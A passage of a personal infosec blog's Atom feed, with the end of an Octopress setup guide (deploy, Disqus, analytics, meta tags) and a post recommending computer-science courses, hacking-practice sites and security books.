<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>rake deploy</span></code></pre></td></tr></table></div></figure>


<p>This will commit your files and push them to the master branch. You will want to commit your sorce, too. In your blog directory, run these git commands:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>git add .
</span><span class='line'>git commit -m 'message here'
</span><span class='line'>git push origin source</span></code></pre></td></tr></table></div></figure>


<p>And now you have an awesome Octopress blog out there on the web!</p>

<h4>Disqus comments</h4>

<p>To enable comments, in your _config.yml file, look for these lines and change them accordingly:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>disqus_short_name: your-disqus-shortname # your website shortname on disqus 
</span><span class='line'>disqus_show_comment_count: true</span></code></pre></td></tr></table></div></figure>


<p>When setting up your site on Disqus, be careful with the URL you give it. Pass it like this:</p>

<p><em>mysite.com</em></p>

<p>instead of this:</p>

<p><em>mysite.com/</em></p>

<p>Because Disqus adds a trailing slash after your URL, if you also provide one, you will end up with 2 slashes and Disqus won&rsquo;t work.</p>

<h3>SEO</h3>

<h4>Google Analytics</h4>

<p>To get Google Analytics to track your blog, all you need to do is add your tracking id in the <code>_config.yml</code> file:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'># Google Analytics
</span><span class='line'>google_analytics_tracking_id: your id</span></code></pre></td></tr></table></div></figure>


<h4>Meta tags and description</h4>

<p>To add keywords and description for each individual post, you have to manually add them to every post (before the dashed line):</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>keywords: keyword 1, keyword 2
</span><span class='line'>description: Description for the post</span></code></pre></td></tr></table></div></figure>


<p>And to add keywords and description for the blog as a whole (by default, Octopress uses the ones from your latest post), edit your <code>_config.yml</code> file (I only had to add the keywords tag, description was already there):</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>decription: Your blog description
</span><span class='line'>keywords: keyword 1, keyword 2</span></code></pre></td></tr></table></div></figure>


<p>Now you need to make one final modification to generate the meta tags in your HTML. Go to your <code>source/_includes/head.html</code> file.</p>

<p>Under the <em>author</em> meta tag, replace this lines:</p>

<figure class='code'><figcaption><span> (head.html)</span> <a href='http://chousensha.github.io/downloads/code/head.html'>download</a></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='html'><span class='line'>{% capture description %}{% if page.description %}{{ page.description }}{% else %}{{ content | raw_content }}{% endif %}{% endcapture %}
</span><span class='line'>{% if page.keywords %}<span class="nt">&lt;meta</span> <span class="na">name=</span><span class="s">&quot;keywords&quot;</span> <span class="na">content=</span><span class="s">&quot;{{ page.keywords }}&quot;</span><span class="nt">&gt;</span>{% endif %}
</span></code></pre></td></tr></table></div></figure>


<p>with these:</p>

<figure class='code'><figcaption><span> (new_head.html)</span> <a href='http://chousensha.github.io/downloads/code/new_head.html'>download</a></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='html'><span class='line'>{% capture description %}{% if page.description %}{{ page.description }}{% elsif site.description %}{{ site.description }}{%else%}{{ content | raw_content }}{% endif %}{% endcapture %}
</span><span class='line'>{% if page.keywords %}<span class="nt">&lt;meta</span> <span class="na">name=</span><span class="s">&quot;keywords&quot;</span> <span class="na">content=</span><span class="s">&quot;{{ page.keywords }}&quot;</span><span class="nt">&gt;</span>{%else%}<span class="nt">&lt;meta</span> <span class="na">name=</span><span class="s">&quot;keywords&quot;</span> <span class="na">content=</span><span class="s">&quot;{{ site.keywords }}&quot;</span><span class="nt">&gt;</span>{% endif %}
</span></code></pre></td></tr></table></div></figure>


<p>And that&rsquo;s pretty much what I had to do for this blog!</p>

<p>Not forgetting the cookie:</p>

<blockquote><p>You will give someone a piece of your mind, which you can ill afford.</p></blockquote>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Resources for learning]]></title>
    <link href="http://chousensha.github.io/blog/2014/05/21/resources-for-learning/"/>
    <updated>2014-05-21T21:06:58+03:00</updated>
    <id>http://chousensha.github.io/blog/2014/05/21/resources-for-learning</id>
    <content type="html"><![CDATA[<p>All right, we&rsquo;re live!</p>

<p>This blog will serve as my notebook for my infosec learning adventures. Hopefully, it will benefit other learners as well. I am just migrating from my small Blogger blog, because Octopress is so awesome. And it&rsquo;s &ldquo;a blogging framework for hackers&rdquo; of course! That definitely got my attention.</p>

<p>In this post I&rsquo;d like to share some of the resources I&rsquo;ve found most helpful with any interested readers out there.</p>

<!-- more -->


<h3>Online classes</h3>

<ul>
<li><a href="https://www.edx.org/course/harvardx/harvardx-cs50x-introduction-computer-1022">Introduction to Computer Science</a></li>
</ul>


<p>This is by far the closest experience to a real life class that I had. The course focuses on C for assignnments, but towards the end it also introduces web technologies like PHP, Javascript etc. The homework was interesting, like recovering some deleted pictures, removing noise from an image, or implementing a site that lets you query, buy and sell stocks. And students were able to freely choose the field and programming language of the final project, so anyone could pick something they were interested in. All assignments and developement take place on a Linux virtual machine which they made for the course, and they also introduce some additional tools to help you with the homework, like valgrind, gdb etc.</p>

<p>Since the lectures weren&rsquo;t made specifically for an online audience, but were filmed inside their campus, you can get a glimpse of how real life classes are happening at Harvard. There are also sections for beginners and advanced students that present approaches to solving exercises, and walkthroughs that give hints for the problem sets. Forums were very active and helpful, and the teaching staff (including the professor himself) were also participating in the forums, so the course really had a feel of an online community. Back when I took the course, we also received a license key for VMware Workstation for the duration of the course. I can&rsquo;t recommend this enough, it&rsquo;s an extremely high quality course, and it really is a well rounded introductory course &ndash; you don&rsquo;t need previous experience with programming or anything.</p>

<ul>
<li><a href="https://www.edx.org/course/mitx/mitx-6-00-1x-introduction-computer-1841">Introduction to Computer Science and Programming Using Python</a></li>
</ul>


<p>This is my second favorite. Very good introductory course for Python and computer science, and from MIT! Pdf slides were also detailed and relevant to the material, and homework was interesting and adequate for a course for beginners, although the difficulty went up significantly after the first half of the course. Some homework examples: implement a Hangman game, filter RSS feeds, simulate robot movement. Around midway it became more math oriented (and thus more difficult to follow for me). Overall, one of the more difficult introductory courses, but again, a very high quality course.</p>

<ul>
<li><a href="https://www.coursera.org/course/comnetworks">Computer Networks</a></li>
</ul>


<p>This was a pretty solid course for introducing networking, and it focused on theory (and again, there was quite a bit of math involved). Good course, but the pdf slides could have been more detailed. Had to use some external resources pretty often. Well, I always used more resources than were provided in a class, but this time I really felt like I had to do it in order to get the whole picture. Other than that, it was a very good course, I definitely recommend it.</p>

<ul>
<li><a href="https://www.coursera.org/course/malsoftware">Malicious Software and its Underground Economy: Two Sides to Every Story</a></li>
</ul>


<p>This is a one of a kind course. I couldn&rsquo;t find any other that touches the topics of malware and underground markets and botnet practices. In fact, because it was all so interesting, the only complaint I have is that it wasn&rsquo;t longer and with more material. And maybe an assembly and reverse engineering section to complement it. There was a hands-on assignment involving IDA Pro that was optional, and besides the course materials, a lot of papers were provided (and required for assignments).</p>

<ul>
<li><a href="http://www.saylor.org/">Saylor.org</a></li>
</ul>


<p>Here they have alot of computer science classes, but they are mostly Youtube videos and articles. You can get a certificate if you complete the exam. I recommend the Operating Systems course.</p>

<ul>
<li><a href="https://www.udacity.com/">Udacity</a></li>
</ul>


<p>A lot of Python based courses on this one, they are less general purpose courses, focusing on specific areas, like debugging, data science, artifical intelligence, cryptography etc. Good courses, but the notes could be improved. Also, being self paced, the exams stay the same (or so it was the last time I used it). I think they no longer give free certificates for completing the courses, which is a practice I disagree with. Nevertheless, I took my first online class from this site, and it was also the place that introduced me to Python :D</p>

<ul>
<li><a href="http://www.dr-chuck.com/">Dr.Chuck</a></li>
</ul>


<p>Great instructor, has some good introductory courses on Coursera, aimed at complete beginners. The type of guy that can teach programming to anyone, no matter the background.</p>

<ul>
<li><a href="http://opensecuritytraining.info/Training.html">Opensecurity</a></li>
</ul>


<p>This is a great site that hosts training courses on multiple fields, like assembly, reverse engineering, malware, exploits and other. Great material, instructors are professionals and slides and program samples are available for downloading. Video quality isn&rsquo;t exceptional, but other than that it&rsquo;s a fantastic source of information.</p>

<h3>Hands-on learning</h3>

<ul>
<li><a href="http://www.enigmagroup.org/">EnigmaGroup</a></li>
</ul>


<p>This is my favorite place. Great and active community, and a lot of missions that simulate various hacking scenarios where you can learn different techniques to complete the objectives. Attacking improperly configured sites, doing SQLi, XSS, directory traversal, filter evasion, stealing cookies, information gathering, patching insecure code and many more well designed missions, in addition to cracking, programming and steganography missions..and realistic scenarions, where you have to combine multiple techniques to succeed. They also have a mentor system to help people who get stuck on specific missions. This site is my absolute number one recommendation for learning by doing.</p>

<ul>
<li><a href="http://securityoverride.org/challenges/index.php">SecurityOverride</a></li>
</ul>


<p>This is another great site with many interesting missions, and also plenty of articles, tutorials and videos. It has a lesser number of realistic missions than Enigma and HTS, but instead it has some unique mission categories that can&rsquo;t be found on the others, like privilege escalation that simulate an UNIX environment and network forensics, where you have to investigate pcap files.</p>

<ul>
<li><a href="https://www.hackthissite.org/">Hackthissite</a></li>
</ul>


<p>This one is a classic. Loads of missions, a great number of realistic scenarios, and the only one that has a file system forensics mission, or a programming challenge that involves coding an IRC bot. Not as active as it used to be, but it&rsquo;s still an awesome place.</p>

<ul>
<li><a href="https://www.hackthis.co.uk/">HackThis</a></li>
</ul>


<p>Similar to the other sites, but also featuring some unique missions. Not as many or as varied challenges as the rest, but a great site nonetheless. Also, it&rsquo;s active and it&rsquo;s hosting many articles.</p>

<p>I highly recommend all 4 of the above. They might share some similarities, but each has its own unique features and strong points. And there are very knowledgeable people lurking around those forums :)</p>

<ul>
<li><a href="http://overthewire.org/wargames/">OverTheWire</a></li>
</ul>


<p>Another great place, in here you can learn about Linux and exploiting vulnerabilities. There are many missions varying in difficulty, each with many levels. I would say that some initial background is required (or many hours of additional research and reading while doing the missions). Oh, and you actually connect to their machines via SSH and play around on live targets.</p>

<ul>
<li><a href="http://exploit-exercises.com/">Exploit-exercises</a></li>
</ul>


<p>This is another great place to learn and practice exploiting programs. Levels involve buffer overflows, format strings exploitation, heap exploits and other Linux vulnerabilites.</p>

<ul>
<li><a href="http://vulnhub.com/">Vulnhub</a></li>
</ul>


<p>You can download vulnerable virtual machines from here so you can practice on your home lab, and they keep adding new ones. Great place for creating your own pentest lab.</p>

<ul>
<li><a href="https://hack.me/">Hackme</a></li>
</ul>


<p>Here you can practice on vulnerable web applications that other users can upload. Some of them are from CTFs.</p>

<h3>Other</h3>

<ul>
<li><a href="https://www.corelan.be/">Corelan</a></li>
</ul>


<p>The go-to place for learning about exploits.</p>

<ul>
<li><a href="http://www.learncpp.com/">LearnCpp</a></li>
</ul>


<p>Best online tutorial for C++ that I&rsquo;ve used. Could have done without the use of Hungarian notation though.</p>

<ul>
<li><a href="http://www.securitytube.net/">SecurityTube</a></li>
</ul>


<p>Tutorials, code and videos from conferences</p>

<ul>
<li><a href="http://www.irongeek.com/">Irongeek</a></li>
</ul>


<p>Another plethora of resources, videos, conferences, articles and web pentesting tutorials.</p>

<h3>Books</h3>

<p>I&rsquo;ve read many great books, but it would be overkill to post them all here, so I&rsquo;ll just list some favorites.</p>

<ul>
<li>Violent Python</li>
</ul>


<p>This is a magnificent book that combines 2 of my favorite things: pentesting and Python. Great examples of what you can do with Python in the real world. I want more of its like !</p>

<ul>
<li>Hacking: The Art of Exploitation</li>
</ul>


<p>A classic read for learning about exploits. Excellent explanations and examples.</p>

<ul>
<li>SQL Injection Attacks and Defense</li>
</ul>


<p>Everything you would like to know about SQLi, examples for each major database, advice on secure coding, query explanations, cheatsheets..amazing book</p>

<p>I haven&rsquo;t even scratched the surface of what&rsquo;s available out there. But I hope this is a good starting point for other interested people.</p>

<p>And I&rsquo;ll finish with a <em>fortune</em> cookie. Here&rsquo;s the man page description:</p>

<p><em>FORTUNE(6) &ndash; print a random, hopefully interesting, adage</em></p>

<blockquote><p>The Least Successful Collector</p>

<p>Betsy Baker played a central role in the history of collecting.  She
was employed as a servant in the house of John Warburton (1682-1759) who had
amassed a fine collection of 58 first edition plays, including most of the
works of Shakespeare.</p>

<p>One day Warburton returned home to find 55 of them charred beyond
legibility.  Betsy had either burned them or used them as pie bottoms.  The
remaining three folios are now in the British Museum.</p>

<p>The only comparable literary figure was the maid who in 1835 burned
the manuscript of the first volume of Thomas Carlyle&rsquo;s &ldquo;The Hisory of the
French Revolution&rdquo;, thinking it was wastepaper.</p>

<p>&mdash; Stephen Pile, &ldquo;The Book of Heroic Failures&rdquo;</p></blockquote>

<p>Pie bottoms&hellip;</p>
]]></content>
  </entry>
  
</feed>
